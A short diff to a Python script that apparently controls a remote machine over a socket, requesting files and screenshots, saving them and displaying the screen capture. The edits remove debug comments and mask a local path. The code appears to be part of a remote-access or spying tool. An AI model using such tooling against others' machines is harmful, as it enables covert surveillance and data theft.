@@ -78,12 +78,9 @@ def file_transfer(connection, path=""):
         operation = "dt"
     else:
         connection.send("dt".encode("utf-8"))
-        #print("dt isteği gönderildi")
     connection.send(path.encode("utf-8"))
-    #print("path isteği gönderildi")
     save_size = 0
     size = int(connection.recv(8192).decode("utf-8"))
-    #print("size alındı")
     connection.send(b" ")
     
     if operation == "dt":    
@@ -91,7 +88,7 @@ def file_transfer(connection, path=""):
     else:
         file_name = "ss.png"
     print(Fore.GREEN + "Dosya işlemi gerçekleşiyor..."+ Fore.RESET)
-    with open("C:/Users/puyz/Desktop/data/"+file_name, "wb") as file:
+    with open("<path>"+file_name, "wb") as file:
         try:
             while 1:
                 data = connection.recv(1024)
@@ -107,7 +104,7 @@ def file_transfer(connection, path=""):
 def get_screenshot(connection):
     path = connection.recv(1024).decode("utf-8")
     file_transfer(connection, path)
-    image = Image.open("C:/Users/puyz/Desktop/data/ss.png")
+    image = Image.open("<path>/ss.png")
     image.show()
     
     
